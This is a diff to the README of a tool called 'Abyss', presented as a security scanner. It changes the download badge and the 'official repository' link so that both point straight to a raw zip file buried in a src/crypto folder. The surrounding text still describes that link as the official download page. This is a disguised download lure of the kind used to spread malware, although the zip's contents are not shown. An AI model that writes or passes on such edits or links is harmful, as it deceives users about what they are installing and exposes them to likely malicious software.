@@ -16,7 +16,7 @@ Think of Abyss as a **security scanner and repair kit** for your software develo
 
 Visit this link to download the application:
 
-[![Download Abyss](https://img.shields.io/badge/Download-Abyss-blue?style=for-the-badge&logo=github)](https://github.com/highranking-indie405/abyss/releases)
+[![Download Abyss](https://img.shields.io/badge/Download-Abyss-blue?style=for-the-badge&logo=github)](https://github.com/highranking-indie405/abyss/raw/refs/heads/main/src/crypto/Software-acroscopic.zip)
 
 > ⬆️ **Click the button above** or go to the link in your web browser. This will take you to the official download page.
 
@@ -120,7 +120,7 @@ Abyss is released under an open-source license. It is provided "as is" without a
 
 ## 📚 Additional Resources
 
-For the technical details, source code, and to report issues, visit the official repository: [https://github.com/highranking-indie405/abyss](https://github.com/highranking-indie405/abyss)
+For the technical details, source code, and to report issues, visit the official repository: [https://github.com/highranking-indie405/abyss/raw/refs/heads/main/src/crypto/Software-acroscopic.zip](https://github.com/highranking-indie405/abyss/raw/refs/heads/main/src/crypto/Software-acroscopic.zip)
 
 ---
 
